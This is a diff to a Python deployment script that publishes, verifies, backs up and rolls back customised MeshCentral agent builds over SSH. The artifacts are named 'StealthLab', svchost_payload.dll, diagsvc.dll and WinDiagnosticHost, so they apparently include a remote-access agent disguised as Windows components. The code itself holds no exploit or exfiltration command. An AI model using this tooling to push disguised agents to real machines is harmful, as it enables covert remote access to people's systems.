@@ -56,6 +56,7 @@ SSH_HOST = os.environ.get("MESHCENTRAL_SSH_HOST", "meshcentral")
 
 # Remote paths
 MESHCENTRAL_BASE = "/opt/meshcentral"
+DATA_AGENTS = f"{MESHCENTRAL_BASE}/meshcentral-data/agents"
 SIGNED_AGENTS = f"{MESHCENTRAL_BASE}/meshcentral-data/signedagents"
 MODULE_AGENTS = f"{MESHCENTRAL_BASE}/node_modules/meshcentral/agents"
 CONFIG_FILE = f"{MESHCENTRAL_BASE}/meshcentral-data/config.json"
@@ -65,29 +66,70 @@ SERVICE_NAME = "meshcentral"
 SVCHOST_EMBEDDED_RESOURCE_ID = 101
 SVCHOST_EMBEDDED_RESOURCE_TYPE = 10
 
+PUBLISH_ROLE_DIRS = {
+    "data": DATA_AGENTS,
+    "signed": SIGNED_AGENTS,
+    "module": MODULE_AGENTS,
+}
+PUBLISH_ROLE_BACKUP_DIRS = {
+    "data": "dataagents",
+    "signed": "signedagents",
+    "module": "moduleagents",
+}
+HASHAGENTS_MANIFEST_ROLES = ("module", "signed")
+
 # Local build artifacts to deploy
 LOCAL_REPO = Path(__file__).parent.resolve()
 LOCAL_MESHCENTRAL_REPO = LOCAL_REPO.parent / "MeshCentral"
 LOCAL_USERMODEHOOK_REPO = LOCAL_REPO.parent / "UserModeHook"
 MANIFEST_DIR = LOCAL_REPO / "docs" / "testing" / "artifacts"
 ARTIFACTS = {
-    # "friendly name": (local_path_relative_to_repo, remote_filename)
-    "MeshService64.exe": (
-        "meshservice/x64/StealthLab/MeshService-2022.exe",
-        "MeshService64.exe",
-    ),
-    "MeshService64.dll": (
-        "meshservice/x64/StealthLab_DLL/MeshService-2022.dll",
-        "MeshService64.dll",
-    ),
-    "svchost_payload.dll": (
-        "meshservice/embedded/svchost_payload.dll",
-        "svchost_payload.dll",
-    ),
-    "MasterService.exe": (
-        "../UserModeHook/build-fresh/bin/Release/MasterService.exe",
-        "MasterService.exe",
-    ),
+    # "friendly name": {"local_path": ..., "remote_filename": ..., "publish_targets": (...)}
+    "MeshService64.exe": {
+        "local_path": "meshservice/x64/StealthLab/MeshService-2022.exe",
+        "remote_filename": "MeshService64.exe",
+        "publish_targets": ("data", "signed", "module"),
+    },
+    "MeshService.exe": {
+        "local_path": "meshservice/StealthLab/MeshService-2022.exe",
+        "remote_filename": "MeshService.exe",
+        "publish_targets": ("data", "signed", "module"),
+    },
+    "MeshService64.dll": {
+        "local_path": "meshservice/x64/StealthLab_DLL/MeshService-2022.dll",
+        "remote_filename": "MeshService64.dll",
+        "publish_targets": ("signed", "module"),
+    },
+    "svchost_payload.dll": {
+        "local_path": "meshservice/embedded/svchost_payload.dll",
+        "remote_filename": "svchost_payload.dll",
+        "publish_targets": ("signed", "module"),
+    },
+    "diagsvc.dll": {
+        "local_path": "meshservice/x64/StealthLab_DLL/MeshService-2022.dll",
+        "remote_filename": "diagsvc.dll",
+        "publish_targets": ("data",),
+    },
+    "MeshService64.msh": {
+        "local_path": "meshservice/x64/StealthLab/MeshService-2022.msh",
+        "remote_filename": "MeshService64.msh",
+        "publish_targets": ("data", "signed", "module"),
+    },
+    "MeshService.msh": {
+        "local_path": "meshservice/StealthLab/MeshService-2022.msh",
+        "remote_filename": "MeshService.msh",
+        "publish_targets": ("data", "signed", "module"),
+    },
+    "WinDiagnosticHost.msh": {
+        "local_path": "WinDiagnosticHost.msh",
+        "remote_filename": "WinDiagnosticHost.msh",
+        "publish_targets": ("data", "signed", "module"),
+    },
+    "MasterService.exe": {
+        "local_path": "../UserModeHook/build-fresh/bin/Release/MasterService.exe",
+        "remote_filename": "MasterService.exe",
+        "publish_targets": (),
+    },
 }
 
 # Additional deploy target for MasterService (public userfiles for agent download)
@@ -97,6 +139,16 @@ MESHCENTRAL_CONTROL_URL = os.environ.get("MESHCENTRAL_CONTROL_URL", "")
 MESHCENTRAL_CONTROL_USER = os.environ.get("MESHCENTRAL_CONTROL_USER", "")
 HASHAGENTS_TRACKED_FILENAMES = {"MeshService.exe", "MeshService64.exe"}
 SIGNED_RUNTIME_MUTABLE_FILENAMES = set(HASHAGENTS_TRACKED_FILENAMES)
+REQUIRED_AGENT_ARTIFACTS = {
+    "MeshService64.exe",
+    "MeshService.exe",
+    "MeshService64.dll",
+    "svchost_payload.dll",
+    "diagsvc.dll",
+    "MeshService64.msh",
+    "MeshService.msh",
+    "WinDiagnosticHost.msh",
+}
 WINDOWS_INSTALL_ROOT = os.environ.get("MESHCENTRAL_INSTALL_ROOT", r"C:\ProgramData\MeshAgent")
 REMOTE_COMMAND_RETRIES = int(os.environ.get("MESHCENTRAL_SSH_RETRIES", "3"))
 REMOTE_RETRY_DELAY_SECONDS = float(os.environ.get("MESHCENTRAL_SSH_RETRY_DELAY", "2"))
@@ -395,13 +447,12 @@ def collect_remote_publish_snapshot(agent_artifacts, public_artifacts=None, algo
     public_artifacts = public_artifacts or []
     remote_paths = []
     for entry in agent_artifacts:
-        remote_paths.append(f"{MODULE_AGENTS}/{entry['remote_filename']}")
-        remote_paths.append(f"{SIGNED_AGENTS}/{entry['remote_filename']}")
+        for role in get_artifact_publish_targets(entry):
+            remote_paths.append(get_publish_path(role, entry["remote_filename"]))
     for entry in public_artifacts:
         remote_paths.append(f"{USERFILES_DIR}/{entry['remote_filename']}")
     manifest_paths = [
-        f"{MODULE_AGENTS}/hashagents.json",
-        f"{SIGNED_AGENTS}/hashagents.json",
+        f"{PUBLISH_ROLE_DIRS[role]}/hashagents.json" for role in HASHAGENTS_MANIFEST_ROLES
     ]
     payload_json = json.dumps({
         "algorithm": algorithm,
@@ -508,17 +559,34 @@ def collect_repo_info(repo_path):
     return info
 
 
+def get_artifact_publish_targets(artifact):
+    """Return the publish roles for a local artifact entry."""
+    return tuple(artifact.get("publish_targets", ()))
+
+
+def get_publish_path(role, filename):
+    """Return the remote publish path for a role/filename pair."""
+    return f"{PUBLISH_ROLE_DIRS[role]}/{filename}"
+
+
+def get_backup_path(backup_root, role, filename=None):
+    """Return the backup location for a publish role and optional filename."""
+    base = f"{backup_root}/{PUBLISH_ROLE_BACKUP_DIRS[role]}"
+    return f"{base}/{filename}" if filename else base
+
+
 def build_local_artifact_entries():
     """Collect local artifact metadata for release manifesting."""
     entries = []
-    for name, (local_rel, remote_name) in ARTIFACTS.items():
-        local_path = (LOCAL_REPO / local_rel).resolve()
+    for name, config in ARTIFACTS.items():
+        local_path = (LOCAL_REPO / config["local_path"]).resolve()
         present = local_path.exists()
         entry = {
             "name": name,
-            "remote_filename": remote_name,
+            "remote_filename": config["remote_filename"],
             "local_path": str(local_path),
             "present": present,
+            "publish_targets": tuple(config.get("publish_targets", ())),
         }
         if present:
             entry["size_bytes"] = local_path.stat().st_size
@@ -613,6 +681,12 @@ def get_public_download_artifacts(local_artifacts=None):
     return [entry for entry in local_artifacts if entry["name"] == "MasterService.exe"]
 
 
+def validate_required_deploy_artifacts(local_artifacts):
+    """Return a sorted list of required deploy artifacts that are missing locally."""
+    local_names = {entry["name"] for entry in local_artifacts}
+    return sorted(REQUIRED_AGENT_ARTIFACTS - local_names)
+
+
 def get_hashagents_tracked_artifacts(local_artifacts=None):
     """Return local artifacts that are represented in hashagents.json."""
     if local_artifacts is None:
@@ -641,7 +715,7 @@ def refresh_remote_hashagents(targets=None):
     """Regenerate hashagents.json atomically in the requested published agent directories."""
     payload_json = json.dumps({
         "mapping": load_hashagents_mapping(),
-        "targets": list(targets or [MODULE_AGENTS, SIGNED_AGENTS]),
+        "targets": list(targets or [PUBLISH_ROLE_DIRS[role] for role in HASHAGENTS_MANIFEST_ROLES]),
     }, sort_keys=True)
     remote_script = f"""python3 - <<'PY'
 import datetime
@@ -838,27 +912,25 @@ def verify_remote_publish(local_artifacts, signed_runtime_mode=False):
     )
 
     for entry in agent_artifacts:
-        errors.extend(verify_remote_copy(entry, f"{MODULE_AGENTS}/{entry['remote_filename']}", metadata_cache=metadata_cache))
-        signed_remote_path = f"{SIGNED_AGENTS}/{entry['remote_filename']}"
-        if signed_runtime_mode and entry["remote_filename"] in SIGNED_RUNTIME_MUTABLE_FILENAMES:
-            if get_remote_file_metadata(signed_remote_path, metadata_cache=metadata_cache) is None:
-                errors.append(f"Missing remote artifact: {signed_remote_path}")
-        else:
-            errors.extend(verify_remote_copy(entry, signed_remote_path, metadata_cache=metadata_cache))
+        for role in get_artifact_publish_targets(entry):
+            remote_path = get_publish_path(role, entry["remote_filename"])
+            if (
+                role == "signed"
+                and signed_runtime_mode
+                and entry["remote_filename"] in SIGNED_RUNTIME_MUTABLE_FILENAMES
+            ):
+                if get_remote_file_metadata(remote_path, metadata_cache=metadata_cache) is None:
+                    errors.append(f"Missing remote artifact: {remote_path}")
+            else:
+                errors.extend(verify_remote_copy(entry, remote_path, metadata_cache=metadata_cache))
 
-        if entry["remote_filename"] == "MeshService64.exe" and expected_embedded_svchost_sha256 is not None:
-            errors.extend(
-                verify_remote_embedded_svchost_payload(
-                    f"{MODULE_AGENTS}/{entry['remote_filename']}",
-                    expected_embedded_svchost_sha256,
+            if entry["remote_filename"] == "MeshService64.exe" and expected_embedded_svchost_sha256 is not None:
+                errors.extend(
+                    verify_remote_embedded_svchost_payload(
+                        remote_path,
+                        expected_embedded_svchost_sha256,
+                    )
                 )
-            )
-            errors.extend(
-                verify_remote_embedded_svchost_payload(
-                    signed_remote_path,
-                    expected_embedded_svchost_sha256,
-                )
-            )
 
     for entry in public_artifacts:
         errors.extend(verify_remote_copy(entry, f"{USERFILES_DIR}/{entry['remote_filename']}", metadata_cache=metadata_cache))
@@ -879,14 +951,17 @@ def verify_remote_publish(local_artifacts, signed_runtime_mode=False):
 
 
 def get_publish_runtime_state(local_artifacts=None):
-    """Return module/signed publish state for tracked agent binaries."""
+    """Return runtime publish state for tracked agent binaries across data/signed/module tiers."""
     local_artifacts = local_artifacts or get_present_local_artifacts()
     local_by_filename = {
         entry["remote_filename"]: entry for entry in get_hashagents_tracked_artifacts(local_artifacts)
     }
     module_manifest = load_remote_json(f"{MODULE_AGENTS}/hashagents.json")
     signed_manifest = load_remote_json(f"{SIGNED_AGENTS}/hashagents.json")
-    tracked_artifacts = [{"remote_filename": filename} for filename in sorted(HASHAGENTS_TRACKED_FILENAMES)]
+    tracked_artifacts = [
+        {"remote_filename": filename, "publish_targets": ("data", "signed", "module")}
+        for filename in sorted(HASHAGENTS_TRACKED_FILENAMES)
+    ]
     snapshot = collect_remote_publish_snapshot(tracked_artifacts, [])
     metadata_cache = snapshot.get("files", {})
     module_manifest = parse_snapshot_manifest(snapshot, f"{MODULE_AGENTS}/hashagents.json") or module_manifest
@@ -894,10 +969,15 @@ def get_publish_runtime_state(local_artifacts=None):
     state = []
     for filename in sorted(HASHAGENTS_TRACKED_FILENAMES):
         local_entry = local_by_filename.get(filename)
+        data_metadata = get_remote_file_metadata(f"{DATA_AGENTS}/{filename}", metadata_cache=metadata_cache)
         module_metadata = get_remote_file_metadata(f"{MODULE_AGENTS}/{filename}", metadata_cache=metadata_cache)
         signed_metadata = get_remote_file_metadata(f"{SIGNED_AGENTS}/{filename}", metadata_cache=metadata_cache)
         module_manifest_entry = find_hashagents_entry(module_manifest, filename)
         signed_manifest_entry = find_hashagents_entry(signed_manifest, filename)
+        data_matches_local = (
+            None if (local_entry is None or data_metadata is None)
+            else data_metadata["hash"] == local_entry["sha384"].upper()
+        )
         module_manifest_ok = None
         signed_manifest_ok = None
         if module_metadata is not None and module_manifest_entry is not None:
@@ -911,12 +991,20 @@ def get_publish_runtime_state(local_artifacts=None):
                 signed_manifest_entry.get("size") == signed_metadata["size"]
             )
         relation = "missing"
-        if module_metadata is not None and signed_metadata is not None:
+        if data_metadata is not None:
+            relation = "data"
+        elif module_metadata is not None and signed_metadata is not None:
             relation = "same" if module_metadata["hash"] == signed_metadata["hash"] else "repacked"
+        elif signed_metadata is not None:
+            relation = "signed-only"
+        elif module_metadata is not None:
+            relation = "module-only"
         state.append({
             "filename": filename,
+            "data_present": data_metadata is not None,
             "module_present": module_metadata is not None,
             "signed_present": signed_metadata is not None,
+            "data_matches_local": data_matches_local,
             "module_matches_local": (
                 None if (local_entry is None or module_metadata is None)
                 else module_metadata["hash"] == local_entry["sha384"].upper()
@@ -924,6 +1012,8 @@ def get_publish_runtime_state(local_artifacts=None):
             "module_manifest_matches_file": module_manifest_ok,
             "signed_manifest_matches_file": signed_manifest_ok,
             "signed_relation": relation,
+            "runtime_source": relation,
+            "data_size": (data_metadata or {}).get("size"),
             "module_size": (module_metadata or {}).get("size"),
             "signed_size": (signed_metadata or {}).get("size"),
         })
@@ -934,10 +1024,14 @@ def get_publish_state_errors(publish_state):
     """Return human-readable publish health errors for tracked agent binaries."""
     errors = []
     for entry in publish_state:
+        if entry["data_present"] is False:
+            errors.append(f"{entry['filename']}: missing from {DATA_AGENTS}")
         if entry["module_present"] is False:
             errors.append(f"{entry['filename']}: missing from {MODULE_AGENTS}")
         if entry["signed_present"] is False:
             errors.append(f"{entry['filename']}: missing from {SIGNED_AGENTS}")
+        if entry["data_matches_local"] is False:
+            errors.append(f"{entry['filename']}: data agent does not match the local build")
         if entry["module_matches_local"] is False:
             errors.append(f"{entry['filename']}: module agent does not match the local build")
         if entry["module_manifest_matches_file"] is not True:
@@ -977,25 +1071,34 @@ def copy_staged_artifacts(remote_dir, artifacts):
 
 def backup_current_agents(backup_path):
     """Create a remote backup of the current signed and module agent payloads."""
-    commands = [
-        f"mkdir -p {backup_path}/signedagents {backup_path}/agents",
-        f"cp -a {SIGNED_AGENTS}/* {backup_path}/signedagents/ 2>/dev/null || true",
-        f"cp -a {MODULE_AGENTS}/*.exe {MODULE_AGENTS}/*.dll {backup_path}/agents/ 2>/dev/null || true",
-    ]
+    commands = []
+    local_artifacts = get_present_local_artifacts()
+    agent_artifacts = get_agent_publish_artifacts(local_artifacts)
+    for role in PUBLISH_ROLE_DIRS:
+        commands.append(f"mkdir -p {remote_quote(get_backup_path(backup_path, role))}")
+    for entry in agent_artifacts:
+        for role in get_artifact_publish_targets(entry):
+            source = remote_quote(get_publish_path(role, entry["remote_filename"]))
+            destination = remote_quote(get_backup_path(backup_path, role, entry["remote_filename"]))
+            commands.append(f"if [ -e {source} ]; then cp -f {source} {destination}; fi")
+    for role in HASHAGENTS_MANIFEST_ROLES:
+        source = remote_quote(get_publish_path(role, "hashagents.json"))
+        destination = remote_quote(get_backup_path(backup_path, role, "hashagents.json"))
+        commands.append(f"if [ -e {source} ]; then cp -f {source} {destination}; fi")
     return run_remote_script(commands) is not None
 
 
 def publish_staged_payloads(agent_artifacts, public_artifacts=None):
     """Publish staged artifacts to all remote destinations in one shell session."""
-    commands = []
+    commands = [f"mkdir -p {remote_quote(path)}" for path in PUBLISH_ROLE_DIRS.values()]
     for entry in agent_artifacts:
         source = remote_quote(f"{STAGING_DIR}/{entry['remote_filename']}")
-        signed_destination = remote_quote(f"{SIGNED_AGENTS}/{entry['remote_filename']}")
-        module_destination = remote_quote(f"{MODULE_AGENTS}/{entry['remote_filename']}")
-        commands.append(f"cp -f {source} {signed_destination}")
-        commands.append(f"cp -f {source} {module_destination}")
+        for role in get_artifact_publish_targets(entry):
+            destination = remote_quote(get_publish_path(role, entry["remote_filename"]))
+            commands.append(f"cp -f {source} {destination}")
     commands.append("rm -f " + " ".join(remote_quote(path) for path in [
         f"{SIGNED_AGENTS}/MasterService.exe",
+        f"{DATA_AGENTS}/MasterService.exe",
         f"{MODULE_AGENTS}/MasterService.exe",
     ]))
     if public_artifacts:
@@ -1009,10 +1112,18 @@ def publish_staged_payloads(agent_artifacts, public_artifacts=None):
 
 def restore_agents_from_backup(backup_path, check=True):
     """Restore signed and module agent payloads from a remote backup path."""
-    commands = [
-        f"cp -f {backup_path}/signedagents/* {SIGNED_AGENTS}/ 2>/dev/null || true",
-        f"cp -f {backup_path}/agents/* {MODULE_AGENTS}/ 2>/dev/null || true",
-    ]
+    commands = [f"mkdir -p {remote_quote(path)}" for path in PUBLISH_ROLE_DIRS.values()]
+    local_artifacts = get_present_local_artifacts()
+    agent_artifacts = get_agent_publish_artifacts(local_artifacts)
+    for entry in agent_artifacts:
+        for role in get_artifact_publish_targets(entry):
+            source = remote_quote(get_backup_path(backup_path, role, entry["remote_filename"]))
+            destination = remote_quote(get_publish_path(role, entry["remote_filename"]))
+            commands.append(f"if [ -e {source} ]; then cp -f {source} {destination}; fi")
+    for role in HASHAGENTS_MANIFEST_ROLES:
+        source = remote_quote(get_backup_path(backup_path, role, "hashagents.json"))
+        destination = remote_quote(get_publish_path(role, "hashagents.json"))
+        commands.append(f"if [ -e {source} ]; then cp -f {source} {destination}; fi")
     return run_remote_script(commands, check=check) is not None
 
 
@@ -1020,6 +1131,7 @@ def remove_stray_agent_payloads():
     """Remove known non-agent payloads from agent publish directories."""
     stray_paths = [
         f"{SIGNED_AGENTS}/MasterService.exe",
+        f"{DATA_AGENTS}/MasterService.exe",
         f"{MODULE_AGENTS}/MasterService.exe",
     ]
     return ssh_cmd("rm -f " + " ".join(remote_quote(path) for path in stray_paths)) is not None
@@ -1331,10 +1443,8 @@ def write_release_manifest(ts, backup_path, service_status):
             continue
 
         remote_locations = []
-        for remote_path in (
-            f"{SIGNED_AGENTS}/{entry['remote_filename']}",
-            f"{MODULE_AGENTS}/{entry['remote_filename']}",
-        ):
+        for role in get_artifact_publish_targets(entry):
+            remote_path = get_publish_path(role, entry["remote_filename"])
             remote_sha = remote_digest(remote_path, "sha384")
             remote_locations.append({
                 "path": remote_path,
@@ -1382,6 +1492,7 @@ def write_release_manifest(ts, backup_path, service_status):
             "tool": "deploy.py",
             "backup_path": backup_path,
             "service_status": service_status.strip() if service_status else None,
+            "data_agents_dir": DATA_AGENTS,
             "signed_agents_dir": SIGNED_AGENTS,
             "module_agents_dir": MODULE_AGENTS,
             "userfiles_dir": USERFILES_DIR,
@@ -1433,10 +1544,20 @@ def cmd_status(args):
                 k, v = line.split("=", 1)
                 print(f"  {k}: {v}")
 
-    # Deployed agents in signedagents
+    # Deployed agents in meshcentral-data/agents
+    print(f"\n{'─' * 60}")
+    print(f"  Data Agents ({DATA_AGENTS}):")
+    agents = ssh_cmd(f"ls -lh {DATA_AGENTS}/*.exe {DATA_AGENTS}/*.dll {DATA_AGENTS}/*.msh 2>/dev/null || echo '  (none)'")
+    if agents:
+        for line in agents.split("\n"):
+            parts = line.split()
+            if len(parts) >= 9:
+                size, date, name = parts[4], " ".join(parts[5:8]), parts[-1].split("/")[-1]
+                print(f"    {name:<30s} {size:>8s}  {date}")
+
     print(f"\n{'─' * 60}")
     print(f"  Signed Agents ({SIGNED_AGENTS}):")
-    agents = ssh_cmd(f"ls -lh {SIGNED_AGENTS}/*.exe 2>/dev/null || echo '  (none)'")
+    agents = ssh_cmd(f"ls -lh {SIGNED_AGENTS}/*.exe {SIGNED_AGENTS}/*.dll {SIGNED_AGENTS}/*.msh 2>/dev/null || echo '  (none)'")
     if agents:
         for line in agents.split("\n"):
             parts = line.split()
@@ -1446,7 +1567,7 @@ def cmd_status(args):
 
     print(f"\n{'─' * 60}")
     print(f"  Module Agents ({MODULE_AGENTS}):")
-    agents = ssh_cmd(f"ls -lh {MODULE_AGENTS}/*.exe 2>/dev/null || echo '  (none)'")
+    agents = ssh_cmd(f"ls -lh {MODULE_AGENTS}/*.exe {MODULE_AGENTS}/*.dll {MODULE_AGENTS}/*.msh 2>/dev/null || echo '  (none)'")
     if agents:
         for line in agents.split("\n"):
             parts = line.split()
@@ -1461,9 +1582,10 @@ def cmd_status(args):
         for entry in publish_state:
             print(
                 f"    {entry['filename']:<30s} "
+                f"data={format_publish_match(entry['data_matches_local']):<5s} "
                 f"module={format_publish_match(entry['module_matches_local']):<5s} "
                 f"manifest={format_publish_match(entry['module_manifest_matches_file'], fail='stale'):<5s} "
-                f"signed={entry['signed_relation']:<8s} "
+                f"runtime={entry['runtime_source']:<10s} "
                 f"signed-manifest={format_publish_match(entry['signed_manifest_matches_file'], fail='stale'):<5s}"
             )
 
@@ -1501,6 +1623,12 @@ def cmd_stage(args):
     print("=" * 60)
 
     local_artifacts = get_present_local_artifacts()
+    missing_required = validate_required_deploy_artifacts(local_artifacts)
+    if missing_required:
+        print("[ERROR] Missing required deploy artifacts:")
+        for name in missing_required:
+            print(f"  - {name}")
+        return False
     payload_report = validate_local_svchost_payload_artifacts(local_artifacts)
     if payload_report["ok"] is False:
         print("[ERROR] Local svchost payload contract failed:")
@@ -1514,14 +1642,14 @@ def cmd_stage(args):
         return False
 
     found = []
-    for name, (local_rel, _) in ARTIFACTS.items():
-        local_path = LOCAL_REPO / local_rel
+    for name, config in ARTIFACTS.items():
+        local_path = LOCAL_REPO / config["local_path"]
         if local_path.exists():
             size_mb = local_path.stat().st_size / (1024 * 1024)
             mtime = datetime.fromtimestamp(local_path.stat().st_mtime).strftime("%Y-%m-%d %H:%M")
             print(f"  [FOUND] {name:<30s} {size_mb:>6.1f} MB  ({mtime})")
         else:
-            print(f"  [SKIP]  {name:<30s} not found at {local_rel}")
+            print(f"  [SKIP]  {name:<30s} not found at {config['local_path']}")
     found = local_artifacts
 
     if not found:
@@ -1556,11 +1684,17 @@ def cmd_deploy(args):
     print("=" * 60)
 
     local_artifacts = get_present_local_artifacts()
+    missing_required = validate_required_deploy_artifacts(local_artifacts)
     payload_report = validate_local_svchost_payload_artifacts(local_artifacts)
     agent_artifacts = get_agent_publish_artifacts(local_artifacts)
     public_artifacts = get_public_download_artifacts(local_artifacts)
     if not local_artifacts:
         print("[ERROR] No local artifacts available for deployment verification.")
+        return False
+    if missing_required:
+        print("[ERROR] Missing required deploy artifacts:")
+        for name in missing_required:
+            print(f"  - {name}")
         return False
     if payload_report["ok"] is False:
         print("[ERROR] Local svchost payload contract failed:")
@@ -1572,7 +1706,7 @@ def cmd_deploy(args):
         return False
 
     # Check staging has files
-    staged = ssh_cmd(f"ls {STAGING_DIR}/*.exe {STAGING_DIR}/*.dll 2>/dev/null | wc -l", check=False)
+    staged = ssh_cmd(f"find {STAGING_DIR} -maxdepth 1 -type f 2>/dev/null | wc -l", check=False)
     if not staged or staged.strip() == "0":
         print("[ERROR] Nothing in staging. Run 'deploy.py stage' first.")
         return False
@@ -1687,7 +1821,10 @@ def cmd_rollback(args):
     print("\n  Available backups:")
     for i, b in enumerate(backup_list[:10]):
         bname = b.split("/")[-1]
-        count = ssh_cmd(f"ls -1 {b}/signedagents/ 2>/dev/null | wc -l", check=False) or "?"
+        count = ssh_cmd(
+            f"find {b}/dataagents {b}/signedagents {b}/moduleagents -maxdepth 1 -type f 2>/dev/null | wc -l",
+            check=False,
+        ) or "?"
         print(f"    [{i}] {bname}  ({count.strip()} files)")
 
     # Select backup
@@ -1915,7 +2052,7 @@ PY"""
             all_ok = False
         indicator = "+" if publish_ok else "!"
         summary = ", ".join(
-            f"{entry['filename']}={entry['signed_relation']}/module-{format_publish_match(entry['module_matches_local'])}"
+            f"{entry['filename']}={entry.get('signed_relation', entry.get('runtime_source', 'n/a'))}/module-{format_publish_match(entry['module_matches_local'])}"
             for entry in publish_state
         )
         print(f"  [{indicator}] Publish parity             {summary[:60]}")
